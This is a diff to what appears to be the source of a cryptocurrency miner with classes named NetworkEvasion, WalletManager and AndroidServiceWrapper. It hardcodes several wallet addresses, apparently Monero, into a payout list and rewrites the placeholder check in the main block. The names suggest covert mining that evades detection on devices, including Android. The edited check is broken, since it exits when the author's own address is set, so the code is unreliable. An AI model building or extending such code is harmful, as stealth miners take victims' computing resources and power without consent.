@@ -131,7 +131,13 @@ class NetworkEvasion:
 class WalletManager:
     MASTER_WALLET = "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN"
     SUBADDRESSES = ["84VK9aJ3QaP8MCkiV44xhecMhLkRyniYocf7FnCPddoMZSwKewZGuMjTkYELVbxoYr14qYdiJuN2jU9ouDj9GgAtQQc6SVJ",
-                    "
+                    "831r4TUWxzyQjJsnyXLHrFALvTsDNLvsddFo3VngDR5agC71iQJccZ92aqNUaZG7bb5NvfLZE6t6EJ5yujyxWbF8EYZjC8Q",
+                    "84orQoZ3bT3aSumYrPdAqoPdatDYcV6A18Gac2iViv1JBY1WzjwRSJzYer4Y1Cv56Ea8TNLhiiYHDJ7VgSvuKestRqPbZ2h",
+                    "82WP4znsXTdeeoLWZMDR69c6n98Q8x3P3Zk5aTJTJiHJZPUg3jFHYevfo7SFM9dZpk4U7M2HjBgcadUbE94PDkyPKXhTF6y",
+                    "87jrtiGMcysWEocEq5Vt99h2xehAy43TXe6fbn4iHKwAAe87gr7s4GxVBBunrb9NG5dvXvmjeqXwiX2zTX6LydRwAUnMpkC",
+                    "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN",
+                   ]
+        
     
     def __init__(self):
         if self.SUBADDRESSES:
@@ -1952,7 +1958,7 @@ class AndroidServiceWrapper:
             self.miner = None
 
 if __name__ == "__main__":
-    if WALLET_ADDRESS == "YOUR_WALLET_ADDRESS_HERE":
+    if WALLET_ADDRESS == "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN":
         print("Please set your wallet address in the WALLET_ADDRESS variable")
         sys.exit(1)
     
